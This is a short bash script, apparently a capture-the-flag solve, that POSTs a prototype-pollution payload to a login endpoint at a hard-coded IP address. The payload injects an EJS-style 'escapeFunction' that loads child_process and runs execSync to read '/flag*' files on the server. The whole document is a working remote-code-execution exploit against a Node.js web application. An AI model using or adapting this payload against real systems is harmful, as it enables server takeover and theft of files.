#!/bin/bash
curl -X POST -H "Content-Type: application/json" -d '{
    "username": "__proto__",
    "__proto__": {
        "settings": {
            "view options": {
                "client": "true",
                "escapeFunction": "1;return global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /flag*\");"
            }
        }
    }
}' http://211.250.216.249:8071/login/
